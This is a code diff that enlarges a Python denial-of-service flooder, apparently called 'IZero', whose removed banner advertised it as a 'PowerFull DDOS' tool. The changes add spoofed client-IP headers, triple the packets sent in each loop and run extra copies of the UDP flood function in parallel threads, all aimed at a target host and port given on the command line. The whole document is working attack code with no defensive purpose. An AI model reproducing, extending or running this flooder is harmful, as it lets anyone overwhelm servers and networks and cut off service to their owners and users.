@@ -155,9 +155,13 @@ def main():
 
             
     ip_get = socket.gethostbyname(url)
-    massive_headers = { # PPS
-                "Content-Length": "#" * 1024,
-            }
+    massive_headers = {  # PPS
+       "Content-Length": "#" * 1024,
+       "X-Forwarded-For": f"{ip_get}",
+       "Client-IP": f"{ip_get}",
+       "X-Real-IP": f"{ip_get}",
+       "Forwarded": f"{ip_get}",
+}
     
     request = f'GET /{target} HTTP/1.1\r\nHost: {target}\r\n' + ''.join(f'{key}: {value}\r\n' for key, value in massive_headers.items()) + '\r\n\r\n'
     byte = request.encode()
@@ -165,9 +169,9 @@ def main():
         try:
           try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
             for x in range(600000): #PPS
+              s.sendto(byte,addr)
+              s.sendto(byte,addr)
               s.sendto(byte,addr)
           except:
              continue
@@ -178,24 +182,23 @@ def main():
 
 
 def main2():
-    print("                           IZero")
-    print("                           PowerFull DDOS")
-    print("                           Make By IZero")
-    print('')
     ip = str(sys.argv[1])
     port = int(sys.argv[2])
     times = int(sys.argv[3])
     target = socket.gethostbyname(ip)
     url = 'google.com'
     start_time = time.time()
-    print("\033[1m[IZero-Destroyer] IZero Now Using PPS Attack To\033[0m "f"\033[1;38;2;255;100;100m{target}\033[0m"":"f"\033[1;38;2;255;100;100m{port}\033[1;37m""!")
     addr = (str(target), int(port))
 
             
     ip_get = socket.gethostbyname(url)
-    massive_headers = { # PPS
-                "Content-Length": "#" * 1024,
-            }
+    massive_headers = {  # PPS
+       "Content-Length": "#" * 1024,
+       "X-Forwarded-For": f"{ip_get}",
+       "Client-IP": f"{ip_get}",
+       "X-Real-IP": f"{ip_get}",
+       "Forwarded": f"{ip_get}",
+}
     
     request = f'GET /{target} HTTP/1.1\r\nHost: {target}\r\n' + ''.join(f'{key}: {value}\r\n' for key, value in massive_headers.items()) + '\r\n\r\n'
     byte = request.encode()
@@ -203,22 +206,133 @@ def main2():
         try:
           try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
             for x in range(600000): #PPS
+              s.sendto(byte,addr)
+              s.sendto(byte,addr)
               s.sendto(byte,addr)
           except:
              continue
         except:
             continue
-    print("\033[1m[IZero-Destroyer] iZero Now Stop Attack To\033[0m "f"\033[1;38;2;255;100;100m{target}\033[0m"":"f"\033[1;38;2;255;100;100m{port}\033[1;37m""!")
+    sys.exit()
+
+def main3():
+    ip = str(sys.argv[1])
+    port = int(sys.argv[2])
+    times = int(sys.argv[3])
+    target = socket.gethostbyname(ip)
+    url = 'google.com'
+    start_time = time.time()
+    addr = (str(target), int(port))
+
+            
+    ip_get = socket.gethostbyname(url)
+    massive_headers = {  # PPS
+       "Content-Length": "#" * 1024,
+       "X-Forwarded-For": f"{ip_get}",
+       "Client-IP": f"{ip_get}",
+       "X-Real-IP": f"{ip_get}",
+       "Forwarded": f"{ip_get}",
+}
+
+    
+    request = f'GET /{target} HTTP/1.1\r\nHost: {target}\r\n' + ''.join(f'{key}: {value}\r\n' for key, value in massive_headers.items()) + '\r\n\r\n'
+    byte = request.encode()
+    while time.time() - start_time < times:
+        try:
+          try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+            for x in range(600000): #PPS
+              s.sendto(byte,addr)
+              s.sendto(byte,addr)
+              s.sendto(byte,addr)
+          except:
+             continue
+        except:
+            continue
+    sys.exit()
+
+def main4():
+    ip = str(sys.argv[1])
+    port = int(sys.argv[2])
+    times = int(sys.argv[3])
+    target = socket.gethostbyname(ip)
+    url = 'google.com'
+    start_time = time.time()
+    addr = (str(target), int(port))
+
+            
+    ip_get = socket.gethostbyname(url)
+    massive_headers = {  # PPS
+       "Content-Length": "#" * 1024,
+       "X-Forwarded-For": f"{ip_get}",
+       "Client-IP": f"{ip_get}",
+       "X-Real-IP": f"{ip_get}",
+       "Forwarded": f"{ip_get}",
+}
+    
+    request = f'GET /{target} HTTP/1.1\r\nHost: {target}\r\n' + ''.join(f'{key}: {value}\r\n' for key, value in massive_headers.items()) + '\r\n\r\n'
+    byte = request.encode()
+    while time.time() - start_time < times:
+        try:
+          try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+            for x in range(600000): #PPS
+              s.sendto(byte,addr)
+              s.sendto(byte,addr)
+              s.sendto(byte,addr)
+          except:
+             continue
+        except:
+            continue
+    sys.exit()
+
+def main5():
+    ip = str(sys.argv[1])
+    port = int(sys.argv[2])
+    times = int(sys.argv[3])
+    target = socket.gethostbyname(ip)
+    url = 'google.com'
+    start_time = time.time()
+    addr = (str(target), int(port))
+
+            
+    ip_get = socket.gethostbyname(url)
+    massive_headers = {  # PPS
+       "Content-Length": "#" * 1024,
+       "X-Forwarded-For": f"{ip_get}",
+       "Client-IP": f"{ip_get}",
+       "X-Real-IP": f"{ip_get}",
+       "Forwarded": f"{ip_get}",
+}
+    
+    request = f'GET /{target} HTTP/1.1\r\nHost: {target}\r\n' + ''.join(f'{key}: {value}\r\n' for key, value in massive_headers.items()) + '\r\n\r\n'
+    byte = request.encode()
+    while time.time() - start_time < times:
+        try:
+          try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+            for x in range(600000): #PPS
+              s.sendto(byte,addr)
+              s.sendto(byte,addr)
+              s.sendto(byte,addr)
+          except:
+             continue
+        except:
+            continue
     sys.exit()
 
 if __name__ == "__main__":
     izero = threading.Thread(target=main)
     izero2 = threading.Thread(target=main2)
+    izero3 = threading.Thread(target=main3)
+    izero4 = threading.Thread(target=main3)
+    izero5 = threading.Thread(target=main4)
     izero.start()
     izero2.start()
+    izero3.start()
+    izero4.start()
+    izero5.start()
     ip = str(sys.argv[1])
     port = int(sys.argv[2])
     times = int(sys.argv[3])
